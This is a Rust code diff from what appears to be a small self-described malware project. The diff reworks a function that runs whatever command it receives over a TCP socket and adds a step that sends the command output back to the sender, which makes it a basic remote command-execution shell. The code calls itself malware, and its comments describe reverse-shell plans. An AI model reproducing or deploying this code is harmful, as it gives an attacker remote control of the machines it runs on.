@@ -3,20 +3,26 @@ use std::{
     process::{self, Stdio},
 };
 
-use tokio::net::TcpStream;
+use tokio::{
+    io::{AsyncReadExt, AsyncWriteExt},
+    net::TcpStream,
+};
 
 fn shell(command: &str) -> Result<Box<[u8]>, Box<dyn Error>> {
     let mut args: Vec<&str> = command.split(" ").collect();
     let main_arg = args[0];
 
-    if args.len() > 1 {
-        args = args.split_off(1)
-    }
-    dbg!(&args);
-    let result = process::Command::new(main_arg)
-        .args(args)
-        .stdout(Stdio::piped())
-        .output()?;
+    let result = if args.len() > 1 {
+        args = args.split_off(1);
+        process::Command::new(main_arg)
+            .args(args)
+            .stdout(Stdio::piped())
+            .output()?
+    } else {
+        process::Command::new(main_arg)
+            .stdout(Stdio::piped())
+            .output()?
+    };
     let stdout = String::from_utf8(result.stdout.clone());
     let stderr = String::from_utf8(result.stderr.clone());
     println!("{:?}", stdout);
@@ -24,7 +30,7 @@ fn shell(command: &str) -> Result<Box<[u8]>, Box<dyn Error>> {
     Ok(result.stdout.into_boxed_slice())
 }
 
-pub async fn init(socket: TcpStream) -> Result<Box<[u8]>, Box<dyn Error>> {
+pub async fn init(mut socket: TcpStream) -> Result<Box<[u8]>, Box<dyn Error>> {
     // on run... do this:
     /*
      * 1. Detect what shells are on the machine
@@ -35,14 +41,10 @@ pub async fn init(socket: TcpStream) -> Result<Box<[u8]>, Box<dyn Error>> {
     println!("Hello there, i am malware!");
 
     //tokio can be used to spawn a server to create a reverse shell.
-    let mut buffer = vec![0; 1024];
-    match socket.try_read(buffer.as_mut_slice()) {
-        Ok(v) => buffer.truncate(v),
-        Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => (),
-        Err(e) => eprintln!("{}", e),
-    }
+    let mut buffer = vec![];
+    _ = socket.read_to_end(&mut buffer).await;
     let input = String::from_utf8(buffer)?;
-
     let response = shell(input.trim())?;
+    socket.write_all(&response).await?;
     Ok(response)
 }
